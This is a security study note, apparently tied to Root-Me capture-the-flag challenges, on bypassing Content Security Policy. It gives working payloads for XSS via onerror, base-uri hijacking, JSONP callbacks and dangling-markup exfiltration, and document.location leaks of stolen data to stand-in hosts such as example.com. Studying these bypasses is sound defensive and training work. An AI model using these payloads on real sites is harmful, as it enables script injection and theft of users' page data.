# Content Security Policy (CSP)

[![csp_bypass_nonce](../../../../../_badges/rootme/web_client/csp_bypass_nonce.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)

<div class="row row-cols-lg-2"><div>

The Content Security Policy (CSP) is a security mechanism designed to make XSS and other web client attacks harder.

* üêõ We can block inline code execution <small>(no onload/...)</small>
* üñºÔ∏è We can configure the image policy <small>(no external? whitelist? local?)</small>
* üí• We can configure the script policy <small>(no external? whitelist? local?)</small>
* üêç We can configure URLs that we can connect to <small>(ex: fetch(URL))</small>
* ...

We can either use `curl -i URL` and manually inspect the CSP header and meta-tag or use Google [CSP Evaluator](https://csp-evaluator.withgoogle.com/).
</div><div>

Developers can allow some elements to bypass the CSP, such as one specific element allowed to load an external script using a `nonce`.

```html!
<script nonce="some_nonce_here">/*inline code allowed*/</script>
```

‚ò†Ô∏è Nonce must be unique and not predictable for them to be useful.

üìö A great reference: [Beyond XSS, CSP bypass](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/) <small>(0.1k ‚≠ê)</small>.
</div></div>

<hr class="sep-both">

## CSP Bypass

*CSP policies may not be correctly configured and bypassed. Refer to [XSS Malicious Code](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md#xss-malicious-code) and [XSS Filter Bypass](/cybersecurity/red-team/s3.exploitation/vulns/web/xss.md#xss-filter-bypass) for more details.*

<div class="row row-cols-lg-2"><div>

#### CSP Bypass ‚Äî unsafe-inline

[![csp_bypass_inline_code](../../../../../_badges/rootme/web_client/csp_bypass_inline_code.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)

If `unsafe-inline` is enabled, you can execute code using:

```html!
<img src=1 onerror="your_code_here" />
```

<br>

#### CSP Bypass ‚Äî base-uri

[![csp_bypass_nonce_2](../../../../../_badges/rootme/web_client/csp_bypass_nonce_2.svg)]()

If the CSP is lax enough, we may be able to inject a base-uri to an external website we control, allowing us to load files from our server.

```html!
<base href="https://example.com" target="_blank">
<img src="img/dummy.jpg"/>
<!-- https://example.com/img/dummy.jpg -->
```
</div><div>

#### CSP Bypass ‚Äî connect-src 'none'

[![csp_bypass_inline_code](../../../../../_badges/rootme/web_client/csp_bypass_inline_code.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)
[![csp_bypass_jsonp](../../../../../_badges/rootme/web_client/csp_bypass_jsonp.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)
[![csp_bypass_nonce](../../../../../_badges/rootme/web_client/csp_bypass_nonce.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)

If `connect-src` is `none`, any external request will fail. Try:

* `document.location = 'URL/?param=' + <stolen_data>` <small>(CTF-only)</small>
* Automatically submit a hidden form after injecting data inside. Refer to [CSRF](/cybersecurity/red-team/s3.exploitation/vulns/web/csrf.md).

<br>

#### CSP Bypass ‚Äî JSONP ‚Äî script-src

[![csp_bypass_jsonp](../../../../../_badges/rootme/web_client/csp_bypass_jsonp.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)

JSONP was designed to ease the process of connecting an API with the website code: the developer can write code automatically executed after the API has been called within the URL ‚ò†Ô∏è.

Well-known list of public JSONP APIs: [JSONBee](https://github.com/zigoo0/JSONBee) <small>(0.7k ‚≠ê)</small>. Look if your CSP policy is lax enough to allow any of them to be loaded.

```html!
<!-- don't forget "defer" or "async" -->
<script defer src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);alert(2)"></script>
```
</div></div>

<hr class="sep-both">

## Dangling markup

[![csp_bypass_dangling_markup](../../../../../_badges/rootme/web_client/csp_bypass_dangling_markup.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup)
[![csp_bypass_dangling_markup2](../../../../../_badges/rootme/web_client/csp_bypass_dangling_markup2.svg)](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup-2)

<div class="row row-cols-lg-2"><div>

When the CSP is too restrictive and the goal is only to extract some data from the page, we can use dangling markup.

In a nutshell, we insert a tag that will mess with the browser renderer and export the rest of the page to a endpoint we defined.

All of these in Firefox will result in a request to `https://example.com/?<the rest of the HTML page here until the next quote>`.

```html!
<link rel="prefetch" href='https://example.com/?
```
```html!
<img src='https://example.com/?
```
```html!
<meta http-equiv="refresh" content="4; URL='https://example.com/?
```
```html!
<style>@import//example.com?
```

üìö Use either `'` or `"` according to the one that gives the largest range.
</div><div>

Chrome prevents HTTP URLs from containing HTML tags which reduce the number of payloads we can use. FTP didn't work.

The payload below doesn't work in recent versions of edge.

```html!
<body background='//example.com?
<table background='//example.com?
<thead background='//example.com?
<td background='//example.com?
```
</div></div>